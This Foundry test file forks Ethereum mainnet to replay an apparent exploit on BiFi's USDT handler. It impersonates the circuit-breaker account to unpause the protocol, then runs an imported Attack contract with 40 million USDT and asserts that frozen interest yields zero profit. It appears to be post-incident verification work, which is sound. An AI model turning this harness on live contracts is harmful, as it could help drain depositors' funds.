// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {Attack} from "../src/Attack.sol";

interface IERC20V {
    function balanceOf(address) external view returns (uint256);
    function decimals() external view returns (uint8);
}

interface ITokenManager {
    function getCircuitBreaker() external view returns (bool);
    function owner() external view returns (address);
    function setCircuitBreaker(bool emergency) external returns (bool);
}

interface IHandlerView {
    function handlerViewProxy(bytes calldata data) external returns (bool, bytes memory);
}

contract BiFiTest is Test {
    // Ethereum mainnet
    address constant TM = 0x913F2DEe2746CdA2ab34106c47aBC4a8f4e36fa5;
    address constant USDT_HANDLER = 0x808C3bA97268dbF9695b1EC10729E09c7e67A9E3;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;

    uint256 forkBlock;

    function setUp() public {
        string memory rpc = vm.envOr("FORK_RPC_URL", vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com")));
        forkBlock = block.number;
        vm.createSelectFork(rpc);
        forkBlock = block.number;
        console2.log("fork block", forkBlock);
    }

    function _userAmount(address who) internal returns (uint256 dep, uint256 bor) {
        (bool ok, bytes memory ret) = IHandlerView(USDT_HANDLER).handlerViewProxy(
            abi.encodeWithSignature("getUserAmountWithInterest(address)", who)
        );
        require(ok, "view failed");
        (dep, bor) = abi.decode(ret, (uint256, uint256));
    }

    function test_breaker_blocks_everything() public {
        assertTrue(ITokenManager(TM).getCircuitBreaker(), "emergency should be true");
        vm.expectRevert();
        (bool ok,) = USDT_HANDLER.call(abi.encodeWithSignature("deposit(uint256,bool)", uint256(1e18), false));
        ok; // silence
    }

    /// @notice Negative control: ETH was patched at the interest-model level.
    /// setBlocksPerYear(type(uint256).max) was called at block 26,211,988
    /// (2026-10-17 11:30:59 UTC, operator 0x2184ad...), so SIR/block == BIR/block == 0.
    /// Unpausing alone therefore yields exactly zero interest and zero profit.
    function test_replay_interest_frozen_zero_profit() public {
        console2.log("owner", ITokenManager(TM).owner());
        console2.log("emergency before", ITokenManager(TM).getCircuitBreaker());

        // ---- fork-only state override: replay the exact authorized unpause path.
        // 0x81c22bec... is the breaker EOA that called setCircuitBreaker(true) on 2026-10-17.
        // setCircuitBreaker(false) propagates to every handler data-storage, every SI
        // data-storage and the liquidation manager (ManagerSlotSetter source).
        address breaker = 0x81C22BEC01C83E5BFf125d3a52634dBEf60d93d4;
        vm.prank(breaker);
        ITokenManager(TM).setCircuitBreaker(false);
        assertFalse(ITokenManager(TM).getCircuitBreaker(), "breaker not cleared");

        uint256 hBal0 = IERC20V(USDT).balanceOf(USDT_HANDLER);
        console2.log("USDT handler balance before", hBal0);

        Attack atk = new Attack(USDT, USDT_HANDLER, MORPHO);
        uint256 t0 = IERC20V(USDT).balanceOf(address(this));
        atk.run(40_000_000 * 1e6);
        uint256 profit = atk.profit();
        uint256 hBal1 = IERC20V(USDT).balanceOf(USDT_HANDLER);

        (uint256 dep, uint256 bor) = _userAmount(address(atk));
        console2.log("attack profit (USDT)", profit);
        console2.log("handler balance after", hBal1);
        console2.log("withdrawn total", atk.totalWithdrawn());
        console2.log("final debt repaid", atk.finalDebtRepaid());
        console2.log("attacker residual deposit", dep);
        console2.log("attacker residual borrow", bor);
        console2.log("test contract balance delta", IERC20V(USDT).balanceOf(address(this)) - t0);

        // Interest is frozen on ETH: no accrual, no inflated claim, no extraction.
        assertEq(profit, 0, "interest should be frozen");
        assertEq(hBal1, hBal0, "handler balance must be unchanged");
    }
}
